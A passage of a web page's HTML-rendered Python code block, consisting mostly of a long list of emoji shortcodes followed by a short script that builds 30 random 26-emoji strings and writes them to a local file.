class="string">:green_heart:</span></span><br><span class="line"><span class="string">:broken_heart:</span></span><br><span class="line"><span class="string">:heartbeat:</span></span><br><span class="line"><span class="string">:heartpulse:</span></span><br><span class="line"><span class="string">:two_hearts:</span></span><br><span class="line"><span class="string">:revolving_hearts:</span></span><br><span class="line"><span class="string">:cupid:</span></span><br><span class="line"><span class="string">:sparkling_heart:</span></span><br><span class="line"><span class="string">:sparkles:</span></span><br><span class="line"><span class="string">:star:</span></span><br><span class="line"><span class="string">:star2:</span></span><br><span class="line"><span class="string">:dizzy:</span></span><br><span class="line"><span class="string">:boom:</span></span><br><span class="line"><span class="string">:collision:</span></span><br><span class="line"><span class="string">:anger:</span></span><br><span class="line"><span class="string">:exclamation:</span></span><br><span class="line"><span class="string">:question:</span></span><br><span class="line"><span class="string">:grey_exclamation:</span></span><br><span class="line"><span class="string">:grey_question:</span></span><br><span class="line"><span class="string">:zzz:</span></span><br><span class="line"><span class="string">:dash:</span></span><br><span class="line"><span class="string">:sweat_drops:</span></span><br><span class="line"><span class="string">:notes:</span></span><br><span class="line"><span class="string">:musical_note:</span></span><br><span class="line"><span class="string">:fire:</span></span><br><span class="line"><span class="string">:hankey:</span></span><br><span class="line"><span class="string">:poop:</span></span><br><span class="line"><span class="string">:shit:</span></span><br><span class="line"><span class="string">:+1:</span></span><br><span class="line"><span class="string">:thumbsup:</span></span><br><span class="line"><span class="string">:-1:</span></span><br><span class="line"><span class="string">:thumbsdown:</span></span><br><span class="line"><span class="string">:ok_hand:</span></span><br><span class="line"><span class="string">:punch:</span></span><br><span class="line"><span class="string">:facepunch:</span></span><br><span class="line"><span class="string">:fist:</span></span><br><span class="line"><span class="string">:v:</span></span><br><span class="line"><span class="string">:wave:</span></span><br><span class="line"><span class="string">:hand:</span></span><br><span class="line"><span class="string">:raised_hand:</span></span><br><span class="line"><span class="string">:open_hands:</span></span><br><span class="line"><span class="string">:point_up:</span></span><br><span class="line"><span class="string">:point_down:</span></span><br><span class="line"><span class="string">:point_left:</span></span><br><span class="line"><span class="string">:point_right:</span></span><br><span class="line"><span class="string">:raised_hands:</span></span><br><span class="line"><span class="string">:pray:</span></span><br><span class="line"><span class="string">:point_up_2:</span></span><br><span class="line"><span class="string">:clap:</span></span><br><span class="line"><span class="string">:muscle:</span></span><br><span class="line"><span class="string">:metal:</span></span><br><span class="line"><span class="string">:fu:</span></span><br><span class="line"><span class="string">:runner:</span></span><br><span class="line"><span class="string">:running:</span></span><br><span class="line"><span class="string">:couple:</span></span><br><span class="line"><span class="string">:family:</span></span><br><span class="line"><span class="string">:two_men_holding_hands:</span></span><br><span class="line"><span class="string">:two_women_holding_hands:</span></span><br><span class="line"><span class="string">:dancer:</span></span><br><span class="line"><span class="string">:dancers:</span></span><br><span class="line"><span class="string">:ok_woman:</span></span><br><span class="line"><span class="string">:no_good:</span></span><br><span class="line"><span class="string">:information_desk_person:</span></span><br><span class="line"><span class="string">:raising_hand:</span></span><br><span class="line"><span class="string">:bride_with_veil:</span></span><br><span class="line"><span class="string">:person_with_pouting_face:</span></span><br><span class="line"><span class="string">:person_frowning:</span></span><br><span class="line"><span class="string">:bow:</span></span><br><span class="line"><span class="string">:couplekiss:</span></span><br><span class="line"><span class="string">:couple_with_heart:</span></span><br><span class="line"><span class="string">:massage:</span></span><br><span class="line"><span class="string">:haircut:</span></span><br><span class="line"><span class="string">:nail_care:</span></span><br><span class="line"><span class="string">:boy:</span></span><br><span class="line"><span class="string">:girl:</span></span><br><span class="line"><span class="string">:woman:</span></span><br><span class="line"><span class="string">:man:</span></span><br><span class="line"><span class="string">:baby:</span></span><br><span class="line"><span class="string">:older_woman:</span></span><br><span class="line"><span class="string">:older_man:</span></span><br><span class="line"><span class="string">:person_with_blond_hair:</span></span><br><span class="line"><span class="string">:man_with_gua_pi_mao:</span></span><br><span class="line"><span class="string">:man_with_turban:</span></span><br><span class="line"><span class="string">:construction_worker:</span></span><br><span class="line"><span class="string">:cop:</span></span><br><span class="line"><span class="string">:angel:</span></span><br><span class="line"><span class="string">:princess:</span></span><br><span class="line"><span class="string">:smiley_cat:</span></span><br><span class="line"><span class="string">:smile_cat:</span></span><br><span class="line"><span class="string">:heart_eyes_cat:</span></span><br><span class="line"><span class="string">:kissing_cat:</span></span><br><span class="line"><span class="string">:smirk_cat:</span></span><br><span class="line"><span class="string">:scream_cat:</span></span><br><span class="line"><span class="string">:crying_cat_face:</span></span><br><span class="line"><span class="string">:joy_cat:</span></span><br><span class="line"><span class="string">:pouting_cat:</span></span><br><span class="line"><span class="string">:japanese_ogre:</span></span><br><span class="line"><span class="string">:japanese_goblin:</span></span><br><span class="line"><span class="string">:see_no_evil:</span></span><br><span class="line"><span class="string">:hear_no_evil:</span></span><br><span class="line"><span class="string">:speak_no_evil:</span></span><br><span class="line"><span class="string">:guardsman:</span></span><br><span class="line"><span class="string">:skull:</span></span><br><span class="line"><span class="string">:feet:</span></span><br><span class="line"><span class="string">:lips:</span></span><br><span class="line"><span class="string">:kiss:</span></span><br><span class="line"><span class="string">:droplet:</span></span><br><span class="line"><span class="string">:ear:</span></span><br><span class="line"><span class="string">:eyes:</span></span><br><span class="line"><span class="string">:nose:</span></span><br><span class="line"><span class="string">:tongue:</span></span><br><span class="line"><span class="string">:love_letter:</span></span><br><span class="line"><span class="string">:bust_in_silhouette:</span></span><br><span class="line"><span class="string">:busts_in_silhouette:</span></span><br><span class="line"><span class="string">:speech_balloon:</span></span><br><span class="line"><span class="string">:thought_balloon:</span></span><br><span class="line"><span class="string">:feelsgood:</span></span><br><span class="line"><span class="string">:finnadie:</span></span><br><span class="line"><span class="string">:goberserk:</span></span><br><span class="line"><span class="string">:godmode:</span></span><br><span class="line"><span class="string">:hurtrealbad:</span></span><br><span class="line"><span class="string">:rage1:</span></span><br><span class="line"><span class="string">:rage2:</span></span><br><span class="line"><span class="string">:rage3:</span></span><br><span class="line"><span class="string">:rage4:</span></span><br><span class="line"><span class="string">:suspect:</span></span><br><span class="line"><span class="string">:trollface:</span></span><br><span class="line"><span class="string">:sunny:</span></span><br><span class="line"><span class="string">:umbrella:</span></span><br><span class="line"><span class="string">:cloud:</span></span><br><span class="line"><span class="string">:snowflake:</span></span><br><span class="line"><span class="string">:snowman:</span></span><br><span class="line"><span class="string">:zap:</span></span><br><span class="line"><span class="string">:cyclone:</span></span><br><span class="line"><span class="string">:foggy:</span></span><br><span class="line"><span class="string">:ocean:</span></span><br><span class="line"><span class="string">:cat:</span></span><br><span class="line"><span class="string">:dog:</span></span><br><span class="line"><span class="string">:mouse:</span></span><br><span class="line"><span class="string">:hamster:</span></span><br><span class="line"><span class="string">:rabbit:</span></span><br><span class="line"><span class="string">:wolf:</span></span><br><span class="line"><span class="string">:frog:</span></span><br><span class="line"><span class="string">:tiger:</span></span><br><span class="line"><span class="string">:koala:</span></span><br><span class="line"><span class="string">:bear:</span></span><br><span class="line"><span class="string">:pig:</span></span><br><span class="line"><span class="string">:pig_nose:</span></span><br><span class="line"><span class="string">:cow:</span></span><br><span class="line"><span class="string">:boar:</span></span><br><span class="line"><span class="string">:monkey_face:</span></span><br><span class="line"><span class="string">:monkey:</span></span><br><span class="line"><span class="string">:horse:</span></span><br><span class="line"><span class="string">:racehorse:</span></span><br><span class="line"><span class="string">:camel:</span></span><br><span class="line"><span class="string">:sheep:</span></span><br><span class="line"><span class="string">:elephant:</span></span><br><span class="line"><span class="string">:panda_face:</span></span><br><span class="line"><span class="string">:snake:</span></span><br><span class="line"><span class="string">:bird:</span></span><br><span class="line"><span class="string">:baby_chick:</span></span><br><span class="line"><span class="string">:hatched_chick:</span></span><br><span class="line"><span class="string">:hatching_chick:</span></span><br><span class="line"><span class="string">:chicken:</span></span><br><span class="line"><span class="string">:penguin:</span></span><br><span class="line"><span class="string">:turtle:</span></span><br><span class="line"><span class="string">:bug:</span></span><br><span class="line"><span class="string">:honeybee:</span></span><br><span class="line"><span class="string">:ant:</span></span><br><span class="line"><span class="string">:beetle:</span></span><br><span class="line"><span class="string">:snail:</span></span><br><span class="line"><span class="string">:octopus:</span></span><br><span class="line"><span class="string">:tropical_fish:</span></span><br><span class="line"><span class="string">:fish:</span></span><br><span class="line"><span class="string">:whale:</span></span><br><span class="line"><span class="string">:whale2:</span></span><br><span class="line"><span class="string">:dolphin:</span></span><br><span class="line"><span class="string">:cow2:</span></span><br><span class="line"><span class="string">:ram:</span></span><br><span class="line"><span class="string">:rat:</span></span><br><span class="line"><span class="string">:water_buffalo:</span></span><br><span class="line"><span class="string">:tiger2:</span></span><br><span class="line"><span class="string">:rabbit2:</span></span><br><span class="line"><span class="string">:dragon:</span></span><br><span class="line"><span class="string">:goat:</span></span><br><span class="line"><span class="string">:rooster:</span></span><br><span class="line"><span class="string">:dog2:</span></span><br><span class="line"><span class="string">:pig2:</span></span><br><span class="line"><span class="string">:mouse2:</span></span><br><span class="line"><span class="string">:ox:</span></span><br><span class="line"><span class="string">:dragon_face:</span></span><br><span class="line"><span class="string">:blowfish:</span></span><br><span class="line"><span class="string">:crocodile:</span></span><br><span class="line"><span class="string">:dromedary_camel:</span></span><br><span class="line"><span class="string">:leopard:</span></span><br><span class="line"><span class="string">:cat2:</span></span><br><span class="line"><span class="string">:poodle:</span></span><br><span class="line"><span class="string">:paw_prints:</span></span><br><span class="line"><span class="string">:bouquet:</span></span><br><span class="line"><span class="string">:cherry_blossom:</span></span><br><span class="line"><span class="string">:tulip:</span></span><br><span class="line"><span class="string">:four_leaf_clover:</span></span><br><span class="line"><span class="string">:rose:</span></span><br><span class="line"><span class="string">:sunflower:</span></span><br><span class="line"><span class="string">:hibiscus:</span></span><br><span class="line"><span class="string">:maple_leaf:</span></span><br><span class="line"><span class="string">:leaves:</span></span><br><span class="line"><span class="string">:fallen_leaf:</span></span><br><span class="line"><span class="string">:herb:</span></span><br><span class="line"><span class="string">:mushroom:</span></span><br><span class="line"><span class="string">:cactus:</span></span><br><span class="line"><span class="string">:palm_tree:</span></span><br><span class="line"><span class="string">:evergreen_tree:</span></span><br><span class="line"><span class="string">:deciduous_tree:</span></span><br><span class="line"><span class="string">:chestnut:</span></span><br><span class="line"><span class="string">:seedling:</span></span><br><span class="line"><span class="string">:blossom:</span></span><br><span class="line"><span class="string">:ear_of_rice:</span></span><br><span class="line"><span class="string">:shell:</span></span><br><span class="line"><span class="string">:globe_with_meridians:</span></span><br><span class="line"><span class="string">:sun_with_face:</span></span><br><span class="line"><span class="string">:full_moon_with_face:</span></span><br><span class="line"><span class="string">:new_moon_with_face:</span></span><br><span class="line"><span class="string">:new_moon:</span></span><br><span class="line"><span class="string">:waxing_crescent_moon:</span></span><br><span class="line"><span class="string">:first_quarter_moon:</span></span><br><span class="line"><span class="string">:waxing_gibbous_moon:</span></span><br><span class="line"><span class="string">:full_moon:</span></span><br><span class="line"><span class="string">:waning_gibbous_moon:</span></span><br><span class="line"><span class="string">:last_quarter_moon:</span></span><br><span class="line"><span class="string">:waning_crescent_moon:</span></span><br><span class="line"><span class="string">:last_quarter_moon_with_face:</span></span><br><span class="line"><span class="string">:first_quarter_moon_with_face:</span></span><br><span class="line"><span class="string">:crescent_moon:</span></span><br><span class="line"><span class="string">:earth_africa:</span></span><br><span class="line"><span class="string">:earth_americas:</span></span><br><span class="line"><span class="string">:earth_asia:</span></span><br><span class="line"><span class="string">:volcano:</span></span><br><span class="line"><span class="string">:milky_way:</span></span><br><span class="line"><span class="string">:partly_sunny:</span></span><br><span class="line"><span class="string">:octocat:</span></span><br><span class="line"><span class="string">:squirrel:</span></span><br><span class="line"><span class="string">:bamboo:</span></span><br><span class="line"><span class="string">:gift_heart:</span></span><br><span class="line"><span class="string">:dolls:</span></span><br><span class="line"><span class="string">:school_satchel:</span></span><br><span class="line"><span class="string">:mortar_board:</span></span><br><span class="line"><span class="string">:flags:</span></span><br><span class="line"><span class="string">:fireworks:</span></span><br><span class="line"><span class="string">:sparkler:</span></span><br><span class="line"><span class="string">:wind_chime:</span></span><br><span class="line"><span class="string">:rice_scene:</span></span><br><span class="line"><span class="string">:jack_o_lantern:</span></span><br><span class="line"><span class="string">:ghost:</span></span><br><span class="line"><span class="string">:santa:</span></span><br><span class="line"><span class="string">:christmas_tree:</span></span><br><span class="line"><span class="string">:gift:</span></span><br><span class="line"><span class="string">:bell:</span></span><br><span class="line"><span class="string">:no_bell:</span></span><br><span class="line"><span class="string">:tanabata_tree:</span></span><br><span class="line"><span class="string">:tada:</span></span><br><span class="line"><span class="string">:confetti_ball:</span></span><br><span class="line"><span class="string">:balloon:</span></span><br><span class="line"><span class="string">:crystal_ball:</span></span><br><span class="line"><span class="string">:cd:</span></span><br><span class="line"><span class="string">:dvd:</span></span><br><span class="line"><span class="string">:floppy_disk:</span></span><br><span class="line"><span class="string">:camera:</span></span><br><span class="line"><span class="string">:video_camera:</span></span><br><span class="line"><span class="string">:movie_camera:</span></span><br><span class="line"><span class="string">:computer:</span></span><br><span class="line"><span class="string">:tv:</span></span><br><span class="line"><span class="string">:iphone:</span></span><br><span class="line"><span class="string">:phone:</span></span><br><span class="line"><span class="string">:telephone:</span></span><br><span class="line"><span class="string">:telephone_receiver:</span></span><br><span class="line"><span class="string">:pager:</span></span><br><span class="line"><span class="string">:fax:</span></span><br><span class="line"><span class="string">:minidisc:</span></span><br><span class="line"><span class="string">:vhs:</span></span><br><span class="line"><span class="string">:sound:</span></span><br><span class="line"><span class="string">:speaker:</span></span><br><span class="line"><span class="string">:mute:</span></span><br><span class="line"><span class="string">:loudspeaker:</span></span><br><span class="line"><span class="string">:mega:</span></span><br><span class="line"><span class="string">:hourglass:</span></span><br><span class="line"><span class="string">:hourglass_flowing_sand:</span></span><br><span class="line"><span class="string">:alarm_clock:</span></span><br><span class="line"><span class="string">:watch:</span></span><br><span class="line"><span class="string">:radio:</span></span><br><span class="line"><span class="string">:satellite:</span></span><br><span class="line"><span class="string">:loop:</span></span><br><span class="line"><span class="string">:mag:</span></span><br><span class="line"><span class="string">:mag_right:</span></span><br><span class="line"><span class="string">:unlock:</span></span><br><span class="line"><span class="string">:lock:</span></span><br><span class="line"><span class="string">:lock_with_ink_pen:</span></span><br><span class="line"><span class="string">:closed_lock_with_key:</span></span><br><span class="line"><span class="string">:key:</span></span><br><span class="line"><span class="string">:bulb:</span></span><br><span class="line"><span class="string">:flashlight:</span></span><br><span class="line"><span class="string">:high_brightness:</span></span><br><span class="line"><span class="string">:low_brightness:</span></span><br><span class="line"><span class="string">:electric_plug:</span></span><br><span class="line"><span class="string">:battery:</span></span><br><span class="line"><span class="string">:calling:</span></span><br><span class="line"><span class="string">:email:</span></span><br><span class="line"><span class="string">:mailbox:</span></span><br><span class="line"><span class="string">:postbox:</span></span><br><span class="line"><span class="string">:bath:</span></span><br><span class="line"><span class="string">:bathtub:</span></span><br><span class="line"><span class="string">:shower:</span></span><br><span class="line"><span class="string">:toilet:</span></span><br><span class="line"><span class="string">:wrench:</span></span><br><span class="line"><span class="string">:nut_and_bolt:</span></span><br><span class="line"><span class="string">:hammer:</span></span><br><span class="line"><span class="string">:seat:</span></span><br><span class="line"><span class="string">:moneybag:</span></span><br><span class="line"><span class="string">:yen:</span></span><br><span class="line"><span class="string">:dollar:</span></span><br><span class="line"><span class="string">:pound:</span></span><br><span class="line"><span class="string">:euro:</span></span><br><span class="line"><span class="string">:credit_card:</span></span><br><span class="line"><span class="string">:money_with_wings:</span></span><br><span class="line"><span class="string">:e-mail:</span></span><br><span class="line"><span class="string">:inbox_tray:</span></span><br><span class="line"><span class="string">:outbox_tray:</span></span><br><span class="line"><span class="string">:envelope:</span></span><br><span class="line"><span class="string">:incoming_envelope:</span></span><br><span class="line"><span class="string">:postal_horn:</span></span><br><span class="line"><span class="string">:mailbox_closed:</span></span><br><span class="line"><span class="string">:mailbox_with_mail:</span></span><br><span class="line"><span class="string">:mailbox_with_no_mail:</span></span><br><span class="line"><span class="string">:package:</span></span><br><span class="line"><span class="string">:door:</span></span><br><span class="line"><span class="string">:smoking:</span></span><br><span class="line"><span class="string">:bomb:</span></span><br><span class="line"><span class="string">:gun:</span></span><br><span class="line"><span class="string">:hocho:</span></span><br><span class="line"><span class="string">:pill:</span></span><br><span class="line"><span class="string">:syringe:</span></span><br><span class="line"><span class="string">:page_facing_up:</span></span><br><span class="line"><span class="string">:page_with_curl:</span></span><br><span class="line"><span class="string">:bookmark_tabs:</span></span><br><span class="line"><span class="string">:bar_chart:</span></span><br><span class="line"><span class="string">:chart_with_upwards_trend:</span></span><br><span class="line"><span class="string">:chart_with_downwards_trend:</span></span><br><span class="line"><span class="string">:scroll:</span></span><br><span class="line"><span class="string">:clipboard:</span></span><br><span class="line"><span class="string">:calendar:</span></span><br><span class="line"><span class="string">:date:</span></span><br><span class="line"><span class="string">:card_index:</span></span><br><span class="line"><span class="string">:file_folder:</span></span><br><span class="line"><span class="string">:open_file_folder:</span></span><br><span class="line"><span class="string">:scissors:</span></span><br><span class="line"><span class="string">:pushpin:</span></span><br><span class="line"><span class="string">:paperclip:</span></span><br><span class="line"><span class="string">:black_nib:</span></span><br><span class="line"><span class="string">:pencil2:</span></span><br><span class="line"><span class="string">:straight_ruler:</span></span><br><span class="line"><span class="string">:triangular_ruler:</span></span><br><span class="line"><span class="string">:closed_book:</span></span><br><span class="line"><span class="string">:green_book:</span></span><br><span class="line"><span class="string">:blue_book:</span></span><br><span class="line"><span class="string">:orange_book:</span></span><br><span class="line"><span class="string">:notebook:</span></span><br><span class="line"><span class="string">:notebook_with_decorative_cover:</span></span><br><span class="line"><span class="string">:ledger:</span></span><br><span class="line"><span class="string">:books:</span></span><br><span class="line"><span class="string">:bookmark:</span></span><br><span class="line"><span class="string">:name_badge:</span></span><br><span class="line"><span class="string">:microscope:</span></span><br><span class="line"><span class="string">:telescope:</span></span><br><span class="line"><span class="string">:newspaper:</span></span><br><span class="line"><span class="string">:football:</span></span><br><span class="line"><span class="string">:basketball:</span></span><br><span class="line"><span class="string">:soccer:</span></span><br><span class="line"><span class="string">:baseball:</span></span><br><span class="line"><span class="string">:tennis:</span></span><br><span class="line"><span class="string">:8ball:</span></span><br><span class="line"><span class="string">:rugby_football:</span></span><br><span class="line"><span class="string">:bowling:</span></span><br><span class="line"><span class="string">:golf:</span></span><br><span class="line"><span class="string">:mountain_bicyclist:</span></span><br><span class="line"><span class="string">:bicyclist:</span></span><br><span class="line"><span class="string">:horse_racing:</span></span><br><span class="line"><span class="string">:snowboarder:</span></span><br><span class="line"><span class="string">:swimmer:</span></span><br><span class="line"><span class="string">:surfer:</span></span><br><span class="line"><span class="string">:ski:</span></span><br><span class="line"><span class="string">:spades:</span></span><br><span class="line"><span class="string">:hearts:</span></span><br><span class="line"><span class="string">:clubs:</span></span><br><span class="line"><span class="string">:diamonds:</span></span><br><span class="line"><span class="string">:gem:</span></span><br><span class="line"><span class="string">:ring:</span></span><br><span class="line"><span class="string">:trophy:</span></span><br><span class="line"><span class="string">:musical_score:</span></span><br><span class="line"><span class="string">:musical_keyboard:</span></span><br><span class="line"><span class="string">:violin:</span></span><br><span class="line"><span class="string">:space_invader:</span></span><br><span class="line"><span class="string">:video_game:</span></span><br><span class="line"><span class="string">:black_joker:</span></span><br><span class="line"><span class="string">:flower_playing_cards:</span></span><br><span class="line"><span class="string">:game_die:</span></span><br><span class="line"><span class="string">:dart:</span></span><br><span class="line"><span class="string">:mahjong:</span></span><br><span class="line"><span class="string">:clapper:</span></span><br><span class="line"><span class="string">:memo:</span></span><br><span class="line"><span class="string">:pencil:</span></span><br><span class="line"><span class="string">:book:</span></span><br><span class="line"><span class="string">:art:</span></span><br><span class="line"><span class="string">:microphone:</span></span><br><span class="line"><span class="string">:headphones:</span></span><br><span class="line"><span class="string">:trumpet:</span></span><br><span class="line"><span class="string">:saxophone:</span></span><br><span class="line"><span class="string">:guitar:</span></span><br><span class="line"><span class="string">:shoe:</span></span><br><span class="line"><span class="string">:sandal:</span></span><br><span class="line"><span class="string">:high_heel:</span></span><br><span class="line"><span class="string">:lipstick:</span></span><br><span class="line"><span class="string">:boot:</span></span><br><span class="line"><span class="string">:shirt:</span></span><br><span class="line"><span class="string">:tshirt:</span></span><br><span class="line"><span class="string">:necktie:</span></span><br><span class="line"><span class="string">:womans_clothes:</span></span><br><span class="line"><span class="string">:dress:</span></span><br><span class="line"><span class="string">:running_shirt_with_sash:</span></span><br><span class="line"><span class="string">:jeans:</span></span><br><span class="line"><span class="string">:kimono:</span></span><br><span class="line"><span class="string">:bikini:</span></span><br><span class="line"><span class="string">:ribbon:</span></span><br><span class="line"><span class="string">:tophat:</span></span><br><span class="line"><span class="string">:crown:</span></span><br><span class="line"><span class="string">:womans_hat:</span></span><br><span class="line"><span class="string">:mans_shoe:</span></span><br><span class="line"><span class="string">:closed_umbrella:</span></span><br><span class="line"><span class="string">:briefcase:</span></span><br><span class="line"><span class="string">:handbag:</span></span><br><span class="line"><span class="string">:pouch:</span></span><br><span class="line"><span class="string">:purse:</span></span><br><span class="line"><span class="string">:eyeglasses:</span></span><br><span class="line"><span class="string">:fishing_pole_and_fish:</span></span><br><span class="line"><span class="string">:coffee:</span></span><br><span class="line"><span class="string">:tea:</span></span><br><span class="line"><span class="string">:sake:</span></span><br><span class="line"><span class="string">:baby_bottle:</span></span><br><span class="line"><span class="string">:beer:</span></span><br><span class="line"><span class="string">:beers:</span></span><br><span class="line"><span class="string">:cocktail:</span></span><br><span class="line"><span class="string">:tropical_drink:</span></span><br><span class="line"><span class="string">:wine_glass:</span></span><br><span class="line"><span class="string">:fork_and_knife:</span></span><br><span class="line"><span class="string">:pizza:</span></span><br><span class="line"><span class="string">:hamburger:</span></span><br><span class="line"><span class="string">:fries:</span></span><br><span class="line"><span class="string">:poultry_leg:</span></span><br><span class="line"><span class="string">:meat_on_bone:</span></span><br><span class="line"><span class="string">:spaghetti:</span></span><br><span class="line"><span class="string">:curry:</span></span><br><span class="line"><span class="string">:fried_shrimp:</span></span><br><span class="line"><span class="string">:bento:</span></span><br><span class="line"><span class="string">:sushi:</span></span><br><span class="line"><span class="string">:fish_cake:</span></span><br><span class="line"><span class="string">:rice_ball:</span></span><br><span class="line"><span class="string">:rice_cracker:</span></span><br><span class="line"><span class="string">:rice:</span></span><br><span class="line"><span class="string">:ramen:</span></span><br><span class="line"><span class="string">:stew:</span></span><br><span class="line"><span class="string">:oden:</span></span><br><span class="line"><span class="string">:dango:</span></span><br><span class="line"><span class="string">:egg:</span></span><br><span class="line"><span class="string">:bread:</span></span><br><span class="line"><span class="string">:doughnut:</span></span><br><span class="line"><span class="string">:custard:</span></span><br><span class="line"><span class="string">:icecream:</span></span><br><span class="line"><span class="string">:ice_cream:</span></span><br><span class="line"><span class="string">:shaved_ice:</span></span><br><span class="line"><span class="string">:birthday:</span></span><br><span class="line"><span class="string">:cake:</span></span><br><span class="line"><span class="string">:cookie:</span></span><br><span class="line"><span class="string">:chocolate_bar:</span></span><br><span class="line"><span class="string">:candy:</span></span><br><span class="line"><span class="string">:lollipop:</span></span><br><span class="line"><span class="string">:honey_pot:</span></span><br><span class="line"><span class="string">:apple:</span></span><br><span class="line"><span class="string">:green_apple:</span></span><br><span class="line"><span class="string">:tangerine:</span></span><br><span class="line"><span class="string">:lemon:</span></span><br><span class="line"><span class="string">:cherries:</span></span><br><span class="line"><span class="string">:grapes:</span></span><br><span class="line"><span class="string">:watermelon:</span></span><br><span class="line"><span class="string">:strawberry:</span></span><br><span class="line"><span class="string">:peach:</span></span><br><span class="line"><span class="string">:melon:</span></span><br><span class="line"><span class="string">:banana:</span></span><br><span class="line"><span class="string">:pear:</span></span><br><span class="line"><span class="string">:pineapple:</span></span><br><span class="line"><span class="string">:sweet_potato:</span></span><br><span class="line"><span class="string">:eggplant:</span></span><br><span class="line"><span class="string">:tomato:</span></span><br><span class="line"><span class="string">:corn:</span></span><br><span class="line"><span class="string">:house:</span></span><br><span class="line"><span class="string">:house_with_garden:</span></span><br><span class="line"><span class="string">:school:</span></span><br><span class="line"><span class="string">:office:</span></span><br><span class="line"><span class="string">:post_office:</span></span><br><span class="line"><span class="string">:hospital:</span></span><br><span class="line"><span class="string">:bank:</span></span><br><span class="line"><span class="string">:convenience_store:</span></span><br><span class="line"><span class="string">:love_hotel:</span></span><br><span class="line"><span class="string">:hotel:</span></span><br><span class="line"><span class="string">:wedding:</span></span><br><span class="line"><span class="string">:church:</span></span><br><span class="line"><span class="string">:department_store:</span></span><br><span class="line"><span class="string">:european_post_office:</span></span><br><span class="line"><span class="string">:city_sunrise:</span></span><br><span class="line"><span class="string">:city_sunset:</span></span><br><span class="line"><span class="string">:japanese_castle:</span></span><br><span class="line"><span class="string">:european_castle:</span></span><br><span class="line"><span class="string">:tent:</span></span><br><span class="line"><span class="string">:factory:</span></span><br><span class="line"><span class="string">:tokyo_tower:</span></span><br><span class="line"><span class="string">:japan:</span></span><br><span class="line"><span class="string">:mount_fuji:</span></span><br><span class="line"><span class="string">:sunrise_over_mountains:</span></span><br><span class="line"><span class="string">:sunrise:</span></span><br><span class="line"><span class="string">:stars:</span></span><br><span class="line"><span class="string">:statue_of_liberty:</span></span><br><span class="line"><span class="string">:bridge_at_night:</span></span><br><span class="line"><span class="string">:carousel_horse:</span></span><br><span class="line"><span class="string">:rainbow:</span></span><br><span class="line"><span class="string">:ferris_wheel:</span></span><br><span class="line"><span class="string">:fountain:</span></span><br><span class="line"><span class="string">:roller_coaster:</span></span><br><span class="line"><span class="string">:ship:</span></span><br><span class="line"><span class="string">:speedboat:</span></span><br><span class="line"><span class="string">:boat:</span></span><br><span class="line"><span class="string">:sailboat:</span></span><br><span class="line"><span class="string">:rowboat:</span></span><br><span class="line"><span class="string">:anchor:</span></span><br><span class="line"><span class="string">:rocket:</span></span><br><span class="line"><span class="string">:airplane:</span></span><br><span class="line"><span class="string">:helicopter:</span></span><br><span class="line"><span class="string">:steam_locomotive:</span></span><br><span class="line"><span class="string">:tram:</span></span><br><span class="line"><span class="string">:mountain_railway:</span></span><br><span class="line"><span class="string">:bike:</span></span><br><span class="line"><span class="string">:aerial_tramway:</span></span><br><span class="line"><span class="string">:suspension_railway:</span></span><br><span class="line"><span class="string">:mountain_cableway:</span></span><br><span class="line"><span class="string">:tractor:</span></span><br><span class="line"><span class="string">:blue_car:</span></span><br><span class="line"><span class="string">:oncoming_automobile:</span></span><br><span class="line"><span class="string">:car:</span></span><br><span class="line"><span class="string">:red_car:</span></span><br><span class="line"><span class="string">:taxi:</span></span><br><span class="line"><span class="string">:oncoming_taxi:</span></span><br><span class="line"><span class="string">:articulated_lorry:</span></span><br><span class="line"><span class="string">:bus:</span></span><br><span class="line"><span class="string">:oncoming_bus:</span></span><br><span class="line"><span class="string">:rotating_light:</span></span><br><span class="line"><span class="string">:police_car:</span></span><br><span class="line"><span class="string">:oncoming_police_car:</span></span><br><span class="line"><span class="string">:fire_engine:</span></span><br><span class="line"><span class="string">:ambulance:</span></span><br><span class="line"><span class="string">:minibus:</span></span><br><span class="line"><span class="string">:truck:</span></span><br><span class="line"><span class="string">:train:</span></span><br><span class="line"><span class="string">:station:</span></span><br><span class="line"><span class="string">:train2:</span></span><br><span class="line"><span class="string">:bullettrain_front:</span></span><br><span class="line"><span class="string">:bullettrain_side:</span></span><br><span class="line"><span class="string">:light_rail:</span></span><br><span class="line"><span class="string">:monorail:</span></span><br><span class="line"><span class="string">:railway_car:</span></span><br><span class="line"><span class="string">:trolleybus:</span></span><br><span class="line"><span class="string">:ticket:</span></span><br><span class="line"><span class="string">:fuelpump:</span></span><br><span class="line"><span class="string">:vertical_traffic_light:</span></span><br><span class="line"><span class="string">:traffic_light:</span></span><br><span class="line"><span class="string">:warning:</span></span><br><span class="line"><span class="string">:construction:</span></span><br><span class="line"><span class="string">:beginner:</span></span><br><span class="line"><span class="string">:atm:</span></span><br><span class="line"><span class="string">:slot_machine:</span></span><br><span class="line"><span class="string">:busstop:</span></span><br><span class="line"><span class="string">:barber:</span></span><br><span class="line"><span class="string">:hotsprings:</span></span><br><span class="line"><span class="string">:checkered_flag:</span></span><br><span class="line"><span class="string">:crossed_flags:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">out = emoji_list.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">out = out[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">final = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    echo = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        emojiSymbol = emoji.emojize(out[random.randint(<span class="number">0</span>, <span class="built_in">len</span>(out) - <span class="number">1</span>)], use_aliases=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;:&#x27;</span> <span class="keyword">in</span> emojiSymbol:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        echo += emojiSymbol</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">26</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    final += <span class="string">&#x27;ğŸ”¤&#x27;</span> + echo + <span class="string">&#x27;ğŸ”¤ &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;tmp&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(final.encode())</span><br></pre></td></tr></table></figure><h4 